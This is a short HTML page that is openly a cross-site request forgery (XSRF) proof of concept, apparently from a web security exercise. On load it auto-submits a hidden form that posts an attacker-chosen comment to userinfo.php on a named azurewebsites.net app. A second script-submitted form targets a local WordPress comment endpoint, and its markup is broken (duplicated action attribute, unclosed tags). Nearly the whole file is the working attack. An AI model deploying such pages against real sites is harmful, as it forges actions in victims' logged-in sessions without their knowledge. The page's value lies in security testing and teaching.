<!doctype html>
<html>

<head>

    <title>XSRF</title>


</head>
<h1> XSRF ATTACK</h1>

<body onload="document.getElementById('f').submit()">
<form id="f" action="http://webpos-project.azurewebsites.net/userinfo.php" method="post" name="form1">

    <textarea name="comment" wrap="soft"><attacker’svalue></textarea>

</form>
</body>
<form name="CSRF" action =action="http://localhost:85/frameworks/wordpress/wp-comments-post.php" method="post">
    <textarea name="comment" Value="XSRF ATTACK ONE">

</form>
<input name="submit" type="submit" id="submit" class="submit" value="Post Comment" />
<script>
    document.CSRF.submit();
</script>
</body>
</html>